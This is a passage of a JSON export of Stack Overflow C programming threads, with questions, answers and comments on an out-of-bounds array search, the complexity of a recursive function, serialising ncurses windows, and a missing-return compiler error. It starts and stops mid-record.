sizeof(RGBTRIPLE)) % 4) % 4;\n\n// Change size and image size\nbi.biSizeImage = ((sizeof(RGBTRIPLE) * bi.biWidth) + padding) * abs(bi.biHeight);   \nbf.bfSize = bi.biSizeImage + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);\n\n// write outfile's BITMAPFILEHEADER\nfwrite(&amp;bf, sizeof(BITMAPFILEHEADER), 1, outptr);\n\n// write outfile's BITMAPINFOHEADER\nfwrite(&amp;bi, sizeof(BITMAPINFOHEADER), 1, outptr);\n\n// iterate over infile's scanlines\nfor (int i = 0, biHeight = abs(bi.biHeight); i &lt; biHeight; i++)\n{\n    //resize vertically\n    for (int j = 0; j &lt; n; j++)\n    {\n        // temporary storage\n        RGBTRIPLE triple;\n\n        // read RGB triple from infile\n        fread(&amp;triple, sizeof(RGBTRIPLE), 1, inptr);\n\n        // iterate over pixels in scanline\n        for (int k = 0; k &lt; bi.biWidth; k++)\n        {\n            // write RGB triple to outfile\n            fwrite(&amp;triple, sizeof(RGBTRIPLE), n, outptr);\n        }\n        // Add padding, if necessary\n        for (int l = 0; l &lt; padding; l++)\n        {\n            fwrite(0x00, 1, padding, outptr);\n        }\n        if (j == n - 1)\n        {\n            // skip over padding, if any\n            fseek(inptr, padding, SEEK_CUR);\n        }\n        else\n        {\n            fseek(inptr, bi.biWidth, SEEK_CUR);\n        }\n    }\n}\n\n// close infile\nfclose(inptr);\n\n// close outfile\nfclose(outptr);\n\n// success\nreturn 0;\n}\n</code></pre>\n\n<p>Sorry for the horrible spacing.</p>\n"}, {"tags": ["c", "arrays", "debugging"], "comments": [{"owner": {"reputation": 2988, "user_id": 452414, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/rDMfs.png?s=128&g=1", "display_name": "babon", "link": "https://stackoverflow.com/users/452414/babon"}, "edited": false, "score": 4, "creation_date": 1499271705, "post_id": 44931412, "comment_id": 76838638, "body": "<code>ifInList(&amp;array[n], 1)</code> why?"}, {"owner": {"reputation": 47412, "user_id": 3141234, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/78b45a835031f4ce03a6653b3262b5d3?s=128&d=identicon&r=PG", "display_name": "Alexander", "link": "https://stackoverflow.com/users/3141234/alexander"}, "edited": false, "score": 1, "creation_date": 1499271754, "post_id": 44931412, "comment_id": 76838664, "body": "For one, you&#39;re missing a parameter to your function. You need the array, the array&#39;s size, and the element you&#39;re looking for"}, {"owner": {"reputation": 32321, "user_id": 173397, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pqKT8.jpg?s=128&g=1", "display_name": "pm100", "link": "https://stackoverflow.com/users/173397/pm100"}, "edited": false, "score": 1, "creation_date": 1499271845, "post_id": 44931412, "comment_id": 76838717, "body": "you also have 2 things called &#39;n&#39;. The sizeof the array at global scope and the number you are looking for at function scope. Change the array size global to array_size of something like that"}, {"owner": {"reputation": 4649, "user_id": 5601284, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/qVVND.jpg?s=128&g=1", "display_name": "byxor", "link": "https://stackoverflow.com/users/5601284/byxor"}, "edited": false, "score": 1, "creation_date": 1499271889, "post_id": 44931412, "comment_id": 76838752, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/15094834/check-if-a-value-exist-in-a-array\">Check if a value exist in a array</a>"}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1499272746, "post_id": 44931412, "comment_id": 76839288, "body": "Also, try and avoid the use of <i>global</i> variable <i>unless absolutely necessary</i>. There is no reason not to declare all variables in <code>main()</code> and pass as parameters as required here. (some callback functions do need gobals,and there are other uses, but none apply here)"}, {"owner": {"reputation": 25106, "user_id": 6699433, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/1mOTM.jpg?s=128&g=1", "display_name": "klutt", "link": "https://stackoverflow.com/users/6699433/klutt"}, "edited": false, "score": 0, "creation_date": 1499273525, "post_id": 44931412, "comment_id": 76839726, "body": "It is a bit ambiguous what you&#39;re looking for. Your description and code gives the impression that you want to return 1 if element is found and 0 otherwise. However, the printf statement gives another impression. What do you mean?"}], "answers": [{"comments": [{"owner": {"reputation": 9645, "user_id": 1465553, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/5b559f395549789c041652429444dc0a?s=128&d=identicon&r=PG", "display_name": "Saurav Sahu", "link": "https://stackoverflow.com/users/1465553/saurav-sahu"}, "reply_to_user": {"reputation": 17343, "user_id": 445976, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c82b2b9bdcf1baaf4677238d59cf745f?s=128&d=identicon&r=PG", "display_name": "Blastfurnace", "link": "https://stackoverflow.com/users/445976/blastfurnace"}, "edited": false, "score": 0, "creation_date": 1499272509, "post_id": 44931535, "comment_id": 76839113, "body": "Yes, the value considered for <code>n</code> would be the passed one, not the global one. So it is going to access only <code>array[n]</code> eventually. The choice of the variable name is definitely wrong by the coder."}, {"owner": {"reputation": 187, "user_id": 3603077, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/60bb904563c85b506d8bf4f21c1702fb?s=128&d=identicon&r=PG&f=1", "display_name": "thorium", "link": "https://stackoverflow.com/users/3603077/thorium"}, "edited": false, "score": 0, "creation_date": 1499272593, "post_id": 44931535, "comment_id": 76839171, "body": "Thanks, after fixing the n variable issue and how the function was called, it fixed the issue!"}, {"owner": {"reputation": 25106, "user_id": 6699433, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/1mOTM.jpg?s=128&g=1", "display_name": "klutt", "link": "https://stackoverflow.com/users/6699433/klutt"}, "edited": false, "score": 0, "creation_date": 1499273368, "post_id": 44931535, "comment_id": 76839638, "body": "This does not work! It&#39;s completely wrong. I suggest you delete this answer."}, {"owner": {"reputation": 9645, "user_id": 1465553, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/5b559f395549789c041652429444dc0a?s=128&d=identicon&r=PG", "display_name": "Saurav Sahu", "link": "https://stackoverflow.com/users/1465553/saurav-sahu"}, "edited": false, "score": 0, "creation_date": 1499273765, "post_id": 44931535, "comment_id": 76839867, "body": "Edited. Now it should be fine"}], "tags": [], "owner": {"reputation": 9645, "user_id": 1465553, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/5b559f395549789c041652429444dc0a?s=128&d=identicon&r=PG", "display_name": "Saurav Sahu", "link": "https://stackoverflow.com/users/1465553/saurav-sahu"}, "is_accepted": true, "score": 3, "last_activity_date": 1499273453, "last_edit_date": 1499273453, "creation_date": 1499272053, "answer_id": 44931535, "question_id": 44931412, "link": "https://stackoverflow.com/questions/44931412/finding-if-an-element-is-in-an-array-using-c-syntax-issue/44931535#44931535", "title": "Finding if an element is in an array using C (syntax issue)", "body": "<p>You are searching incorrectly:</p>\n\n<pre><code>ifInList(&amp;array[n], 1);\n\narr[0]    arr[1]            ....   a[n-1]    a[n]     \n&lt;----Search only these many elements ---&gt;     ^~~~You are searching unreserved address.\n</code></pre>\n\n<p>Accessing <code>a[n]</code> could result into bugs that are very difficult to debug. You are not supposed to do that at first place.</p>\n\n<p>Correct code :</p>\n\n<pre><code>ifInList(array, sizeOfArray, valueToFind);  //searches in the complete array\n\nfor (j = 0; j &lt; sizeOfArray; j++){  //Loop \n      if (array[j] == valueToFind){\n</code></pre>\n\n<p>Another important advice, try to avoid usage of global variables when they are not necessarily needed. </p>\n"}, {"tags": [], "owner": {"reputation": 25106, "user_id": 6699433, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/1mOTM.jpg?s=128&g=1", "display_name": "klutt", "link": "https://stackoverflow.com/users/6699433/klutt"}, "is_accepted": false, "score": 3, "last_activity_date": 1499272977, "last_edit_date": 1499272977, "creation_date": 1499272432, "answer_id": 44931652, "question_id": 44931412, "link": "https://stackoverflow.com/questions/44931412/finding-if-an-element-is-in-an-array-using-c-syntax-issue/44931652#44931652", "title": "Finding if an element is in an array using C (syntax issue)", "body": "<p>Working code for checking if element <code>n</code> is in an array:</p>\n\n<pre><code>int ifInList(int array[], int size, int n) {\n    int j;\n    for(j=0; j&lt;size; j++)\n        if(array[i]==n)\n            return 1;\n    return 0;\n}\n</code></pre>\n\n<p>You will need three parameters to do this. The array, the size and the element you're looking for.</p>\n\n<p>Other things about your code:</p>\n\n<p>Global variables are in general a bad habit. While you could (theoretically, maybe, but probably not) get away with having the array and the size of it as a global, there's absolutely no reason at all to let j be a global. It should be inside the function ifInList. </p>\n\n<p>As a general rule:</p>\n\n<p>If you're using global variables for convenience, you're doing something wrong. </p>\n"}, {"tags": [], "owner": {"reputation": 700, "user_id": 4337367, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/4e10812e7d10f1fd7f76102f6d99cd4e?s=128&d=identicon&r=PG&f=1", "display_name": "Adama", "link": "https://stackoverflow.com/users/4337367/adama"}, "is_accepted": false, "score": 3, "last_activity_date": 1499272898, "creation_date": 1499272898, "answer_id": 44931785, "question_id": 44931412, "link": "https://stackoverflow.com/questions/44931412/finding-if-an-element-is-in-an-array-using-c-syntax-issue/44931785#44931785", "title": "Finding if an element is in an array using C (syntax issue)", "body": "<p>There are two issues in your code:</p>\n\n<ol>\n<li>You are accessing a memory address which you have <strong>not</strong> reserved: <code>array[n]</code></li>\n<li>Within <code>ifInList</code> you intend to use the name <code>n</code> for both the size of the array (your global variable) and the value you are looking for.</li>\n</ol>\n\n<p>In particular:</p>\n\n<h3>Accessing a memory address you do not own</h3>\n\n<p>In this line:</p>\n\n<pre><code>printf(\"The number is %d \\n\", ifInList(&amp;array[n], 1));\n</code></pre>\n\n<p>You are passing <code>&amp;array[n]</code> as an argument to <code>ifInList</code>. This introduces two types of errors:</p>\n\n<ol>\n<li>Addressing error: <code>array[n]</code> does not exist. It refers to the <code>n+1</code>-th element of the array, a memory address which you have not reserved. In other words, you are \"out of bounds\".</li>\n<li>Logical error: you are not passing the address of the first element of the array. If you fixed it to, say, <code>array[n-1]</code>, your function will only look at the last element of your array. In order to start searching from the first element, you need to pass either <code>array</code> or <code>&amp;array[0]</code>; both are identical and refer to the memory address of the first element.</li>\n</ol>\n\n<h3>Conflicting variable names</h3>\n\n<p>First things first: global variables are almost always a bad idea, they should only be used in \"quick and dirty\" programs and/or for quick debugging purposes, as they can introduce confusion.</p>\n\n<p>You are defining <code>n</code> as a global variable, which refers to the size of <code>array</code>. Nevertheless, within function <code>ifInList</code>, variable <code>n</code> has a different meaning: it's the key you are looking for. Therefore, if you are looking for \"42\" in a <code>array</code> with 3 elements, your function will look up to 42 different elements, instead of 3!</p>\n\n<p>To avoid this confusion, give a different name to the key you are looking for:</p>\n\n<pre><code>int ifInList(int array[], int k){\n    for (j = 0; j &lt; n; j++){\n        if (array[j] == k){\n           return 1;\n        }\n    }\n    return 0;\n}\n</code></pre>\n\n<p>And the recommended approach is to provide the size with the key as arguments, thus eliminating completely the need for a global variable and any other potential conflicts. Furthermore, it's a clean programming practice. Note how I am also defining <code>j</code> within the function:</p>\n\n<pre><code>int ifInList(int array[], int n, int k){\n    int j;\n    for (j = 0; j &lt; n; j++){\n        if (array[j] == k){\n           return 1;\n        }\n    }\n    return 0;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "is_accepted": false, "score": 2, "last_activity_date": 1499273444, "creation_date": 1499273444, "answer_id": 44931938, "question_id": 44931412, "link": "https://stackoverflow.com/questions/44931412/finding-if-an-element-is-in-an-array-using-c-syntax-issue/44931938#44931938", "title": "Finding if an element is in an array using C (syntax issue)", "body": "<p>While you already have good answers for your problem, continuing from my comment, always try and avoid the use of <em>global variables</em>. Declaring variables within proper scope avoids a number of potential problems and name collisions as your projects become larger. You can easily declare all of your variables within <code>main()</code> and pass them as parameters as required to make them available in other parts of your code. A quick example would be:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint ifinlist (int *array, size_t nelem, int n){\n\n    for (size_t j = 0; j &lt; nelem; j++)\n        if (array[j] == n)\n        return 1;\n\n    return 0;\n}\n\nint main (void) {\n\n    int array[] = {1, 3, 5},\n        n = sizeof array / sizeof *array;\n\n    for (int i = 0; i &lt;= array[n - 1]; i++)\n        printf (\"The number '%d' %s present\\n\", \n            i, ifinlist (array, n, i) ? \"is\" : \"is not\");\n\n    return 0;\n}\n</code></pre>\n\n<p><strong>Example Use/Output</strong></p>\n\n<p>Trivial output for the code would be:</p>\n\n<pre><code>$ ./bin/array_inlist\nThe number '0' is not present\nThe number '1' is present\nThe number '2' is not present\nThe number '3' is present\nThe number '4' is not present\nThe number '5' is present\n</code></pre>\n\n<p>Good luck with your coding.</p>\n"}], "owner": {"reputation": 187, "user_id": 3603077, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/60bb904563c85b506d8bf4f21c1702fb?s=128&d=identicon&r=PG&f=1", "display_name": "thorium", "link": "https://stackoverflow.com/users/3603077/thorium"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 122, "favorite_count": 0, "accepted_answer_id": 44931535, "answer_count": 4, "score": 0, "last_activity_date": 1499273453, "creation_date": 1499271613, "last_edit_date": 1499272642, "question_id": 44931412, "link": "https://stackoverflow.com/questions/44931412/finding-if-an-element-is-in-an-array-using-c-syntax-issue", "title": "Finding if an element is in an array using C (syntax issue)", "body": "<p>I'm trying to write a function that checks if an element is an array in C. I have a function here, but it always returns 0, so any debugging help would be appreciated:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nint array[] = {1, 2, 3};\nint *parray = &amp;array;\nint j;\nint n = sizeof(array)/sizeof(array[0]);\n\nint ifInList(int array[], int n){\n    for (j = 0; j &lt; n; j++){\n        if (array[j] == n){\n           return 1;\n        }\n    }\n    return 0;\n}\n\nint main(){\n    printf(\"The number is %d \\n\", ifInList(&amp;array[n], 1));\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "recursion", "time-complexity"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1499270892, "post_id": 44931128, "comment_id": 76838109, "body": "At least describe that the function is supposed to do."}, {"owner": {"reputation": 25106, "user_id": 6699433, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/1mOTM.jpg?s=128&g=1", "display_name": "klutt", "link": "https://stackoverflow.com/users/6699433/klutt"}, "edited": false, "score": 3, "creation_date": 1499271298, "post_id": 44931128, "comment_id": 76838352, "body": "Why do you believe it is n1*n2?"}, {"owner": {"reputation": 80047, "user_id": 169346, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/645dbb4f7ba1ff9d7ff2de02f68fbe9c?s=128&d=identicon&r=PG", "display_name": "JeremyP", "link": "https://stackoverflow.com/users/169346/jeremyp"}, "edited": false, "score": 1, "creation_date": 1499272435, "post_id": 44931128, "comment_id": 76839056, "body": "It&#39;s not <code>O(n1 * n2)</code> The call stack can only ever get <code>n1 - i1</code> deep and there&#39;s no backtracking."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1500077080, "post_id": 44931128, "comment_id": 77197769, "body": "@pnina: you can accept this answer by clicking on the grey checkmark below its score."}], "answers": [{"tags": [], "owner": {"reputation": 3163, "user_id": 3250340, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/vZRom.jpg?s=128&g=1", "display_name": "Antoine C.", "link": "https://stackoverflow.com/users/3250340/antoine-c"}, "is_accepted": false, "score": 0, "last_activity_date": 1499274124, "last_edit_date": 1499274124, "creation_date": 1499273068, "answer_id": 44931842, "question_id": 44931128, "link": "https://stackoverflow.com/questions/44931128/find-the-time-complexity-of-a-recursive-function/44931842#44931842", "title": "Find the time complexity of a recursive function", "body": "<p>Let <code>a</code> be the first integer index where <code>s1[a] != s2[a]</code> \u2227 <code>s1[a] != '\\0'</code> \u2227 <code>s2[a] != '\\0'</code></p>\n\n<p>If <code>a</code> exists, then your function is <strong>O(n1)</strong>.</p>\n\n<p>Else, it is <strong>O(min{ n1, n2 })</strong>.</p>\n\n<hr>\n\n<p>In simpler terms, if one of your string is a right trimmed version of the other one, then the function will be O(n), with n the size of the substring.</p>\n\n<p>Else, it will be O(n1).</p>\n\n<hr>\n\n<p>To understand this, I would advise you to try some iterations of the function yourself, with a pen and a paper, at first without the last <code>if</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": false, "score": 2, "last_activity_date": 1499281866, "last_edit_date": 1499281866, "creation_date": 1499273487, "answer_id": 44931948, "question_id": 44931128, "link": "https://stackoverflow.com/questions/44931128/find-the-time-complexity-of-a-recursive-function/44931948#44931948", "title": "Find the time complexity of a recursive function", "body": "<p>The function increments <code>i1</code> by <code>1</code> for both tail call, hence the time complexity is <strong>O(n1)</strong>.</p>\n\n<p>Note that this function does not implement a variant of <code>strstr()</code> as it would fail to find a match for <code>f(\"aab\", 0, \"ab\", 0)</code>.</p>\n"}], "owner": {"reputation": 139, "user_id": 7639908, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bf777753f2ae2cd9ccf68e81e44610b7?s=128&d=identicon&r=PG&f=1", "display_name": "pnina", "link": "https://stackoverflow.com/users/7639908/pnina"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 82, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1499281866, "creation_date": 1499270622, "last_edit_date": 1499271539, "question_id": 44931128, "link": "https://stackoverflow.com/questions/44931128/find-the-time-complexity-of-a-recursive-function", "title": "Find the time complexity of a recursive function", "body": "<p>Why is the time complexity of this function O(n1*n2) when n1 is the length of s1 and n2 is the length of s2?   </p>\n\n<p>I tried to build an equation but failed. </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint f(char* s1, int i1, char* s2, int i2) {\n    if (s2[i2] == '\\0')\n        return 1;\n    if (s1[i1] == '\\0')\n        return 0;\n    if (s1[i1] != s2[i2])\n        return f(s1, i1 + 1, s2, 0);\n    return f(s1, i1+1, s2, i2+1);\n}\n\nvoid main() {\n    printf(\"%d\", f(\"hello\", 0, \"he\", 0));\n}\n</code></pre>\n"}, {"tags": ["c", "pointers", "struct", "ncurses", "curses"], "comments": [{"owner": {"reputation": 789, "user_id": 7868795, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/471c6f01b994a5aadf85dc6cfec40fc4?s=128&d=identicon&r=PG", "display_name": "Ra&#39;Jiska", "link": "https://stackoverflow.com/users/7868795/rajiska"}, "edited": false, "score": 0, "creation_date": 1499270304, "post_id": 44930979, "comment_id": 76837728, "body": "Your structure needs to be dynamically allocated if you initialize it in your function. Then assign its <code>game</code> variable as such <code>gameState-&gt;game = newwin(20, 50, 2, 2)</code> or <code>gameState-&gt;game = game</code>."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1499270353, "post_id": 44930979, "comment_id": 76837758, "body": "Looks like XY-problem. Why do you want to save the window? It is a frontend. To save a game state you need to save the backend."}, {"owner": {"reputation": 3, "user_id": 7114921, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/acf93733ec2f56fe8cd7170c4c82a766?s=128&d=identicon&r=PG&f=1", "display_name": "Daniel Novaes", "link": "https://stackoverflow.com/users/7114921/daniel-novaes"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1499272782, "post_id": 44930979, "comment_id": 76839309, "body": "@EugeneSh., I&#39;ll do that, thanks for the advice."}, {"owner": {"reputation": 42737, "user_id": 4518274, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UPurS.png?s=128&g=1", "display_name": "Thomas Dickey", "link": "https://stackoverflow.com/users/4518274/thomas-dickey"}, "edited": false, "score": 0, "creation_date": 1499285129, "post_id": 44930979, "comment_id": 76846267, "body": "Actually ncurses 6 stores the result in a (mostly) text-file.  A common assumption for binary files is that the data uses fixed-size records..."}], "answers": [{"tags": [], "owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "is_accepted": false, "score": 0, "last_activity_date": 1499273520, "creation_date": 1499273520, "answer_id": 44931961, "question_id": 44930979, "link": "https://stackoverflow.com/questions/44930979/how-to-save-a-ncurses-window-in-a-structure/44931961#44931961", "title": "How to save a ncurses window in a structure?", "body": "<p>Although it is quite likely that you would be better off serialising the state of the game which produces the window rather than the window itself, there is no problem using <code>putwin</code> and <code>getwin</code> to serialise and retrieve an ncurses Window.</p>\n\n<p><code>putwin</code> just writes a description of the window to the given <code>FILE</code>. It doesn't rewind the file stream, nor does it require it to be rewound. It doesn't close the file stream, either. Similarly, <code>getwin</code> just reads the window description from the given <code>FILE</code> starting at the current read point.</p>\n\n<p>So you can use <code>putwin</code>/<code>getwin</code> as part of a serialisation procedure:</p>\n\n<pre><code>int serialiseWindow(Window* game, FILE* file) {\n  return putwin(game, file);\n}\n\nint serialiseGameState(gameState *state, FILE* file) {\n  int status;\n  status = serialiseWindow(state-&gt;game, file);\n  if (status != OK) return status;\n  status = serialisePositionArray(state-&gt;positions,\n                                  (sizeof state-&gt;positions)/(sizeof *state-&gt;positions),\n                                  file);\n  if (status != OK) return status;\n  status = serialiseInteger(state-&gt;level, file);\n  if (status != OK) return status;\n  status = serialiseInteger(state-&gt;found, file);\n  if (status != OK) return status;\n  status = serialiseIntegerArray(state-&gt;timeSpent,\n                                 (sizeof state-&gt;timeSpent)/(sizeof *state-&gt;timeSpent),\n                                 file);\n  return status;\n}\n</code></pre>\n\n<p>And, to get it back:</p>\n\n<pre><code>int retrieveWindow(Window** game, FILE* file) {\n  Window* win = getwin(file);\n  *game = win;\n  return win ? OK : ERR;\n}\n\nint retrieveGameState(gameState *state, FILE* file) {\n  int status;\n  status = retrieveWindow(&amp;state-&gt;game, file);\n  if (status != OK) return status;\n  status = retrievePositionArray(state-&gt;positions,\n                                 (sizeof state-&gt;positions)/(sizeof *state-&gt;positions),\n                                 file);\n  if (status != OK) return status;\n  status = retrieveInteger(&amp;state-&gt;level, file);\n  if (status != OK) return status;\n  status = retrieveInteger(&amp;state-&gt;found, file);\n  if (status != OK) return status;\n  status = retrieveIntegerArray(state-&gt;timeSpent,\n                                (sizeof state-&gt;timeSpent)/(sizeof *state-&gt;timeSpent),\n                                file);\n  return status;\n}\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 7114921, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/acf93733ec2f56fe8cd7170c4c82a766?s=128&d=identicon&r=PG&f=1", "display_name": "Daniel Novaes", "link": "https://stackoverflow.com/users/7114921/daniel-novaes"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 744, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1499273520, "creation_date": 1499270173, "question_id": 44930979, "link": "https://stackoverflow.com/questions/44930979/how-to-save-a-ncurses-window-in-a-structure", "title": "How to save a ncurses window in a structure?", "body": "<p>I have the following struct:</p>\n\n<pre><code>typedef struct gameState {\n    WINDOW *game;\n    character *player;\n    finalPosition positions[5];\n    int level, found, timeSpent[3];\n} gameState;\n</code></pre>\n\n<p>How can I save in the gameState.game a ncurses window?</p>\n\n<p>This is how I created the window.</p>\n\n<pre><code>WINDOW * game = newwin(20, 50, 2, 2);\n</code></pre>\n\n<p>I think my problem is probably a pointer problem, I'm trying to save a pointer to a struct and whenever I leave the function that created this pointer, it deletes the content of which the pointer points to. </p>\n\n<p>My final objective with this is to save the whole struct into a binary file. I know ncurses have the function putwin(), which saves a window to a binary file, but I need to save the window AND the rest of the content of this struct in the same binary file, so the putwin() doesn't solve my problem.</p>\n"}, {"tags": ["c", "recursion", "return"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1499267609, "post_id": 44930026, "comment_id": 76835816, "body": "If you don&#39;t return anything from a function declared to return something, then you will have <i>undefined behavior</i>."}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1499267655, "post_id": 44930026, "comment_id": 76835847, "body": "The return value isn&#39;t decided when <code>n%2==1</code> ."}, {"owner": {"reputation": 6951, "user_id": 3475381, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/b6a1c5d19f4ae8c6a1dbf097487c96d7?s=128&d=identicon&r=PG&f=1", "display_name": "Gaurav Sehgal", "link": "https://stackoverflow.com/users/3475381/gaurav-sehgal"}, "edited": false, "score": 0, "creation_date": 1499267695, "post_id": 44930026, "comment_id": 76835879, "body": "What do you want the function to do when say <code>n=3</code>"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1499268283, "post_id": 44930026, "comment_id": 76836301, "body": "It does not matter the dup is C++; it would be the same in any other similar programming language"}], "answers": [{"comments": [{"owner": {"reputation": 15, "user_id": 8260015, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/d4f32028a86cc1a6c73dd7d78aaefc30?s=128&d=identicon&r=PG&f=1", "display_name": "doronbs11", "link": "https://stackoverflow.com/users/8260015/doronbs11"}, "edited": false, "score": 0, "creation_date": 1499267832, "post_id": 44930080, "comment_id": 76835975, "body": "got it. thanks alot everyone!"}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1499267874, "post_id": 44930080, "comment_id": 76836012, "body": "The same happens to a negative odd value, why specify <i>positive</i>?"}, {"owner": {"reputation": 70549, "user_id": 4785185, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ChR5h.jpg?s=128&g=1", "display_name": "Prune", "link": "https://stackoverflow.com/users/4785185/prune"}, "edited": false, "score": 0, "creation_date": 1499267928, "post_id": 44930080, "comment_id": 76836053, "body": "Good point ... fixing ..."}], "tags": [], "owner": {"reputation": 70549, "user_id": 4785185, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ChR5h.jpg?s=128&g=1", "display_name": "Prune", "link": "https://stackoverflow.com/users/4785185/prune"}, "is_accepted": false, "score": 1, "last_activity_date": 1499267938, "last_edit_date": 1499267938, "creation_date": 1499267632, "answer_id": 44930080, "question_id": 44930026, "link": "https://stackoverflow.com/questions/44930026/error-control-reaches-end-of-non-void-function/44930080#44930080", "title": "error: control reaches end of non-void function:(", "body": "<p>In the first example, any odd number will cause the program to fall off the bottom of the function without a <code>return</code>.  The declared type, <code>int</code>, requires a return value.  When you added an <code>else</code> clause with a return value, you covered the remaining case with a value.</p>\n"}, {"tags": [], "owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "is_accepted": false, "score": 1, 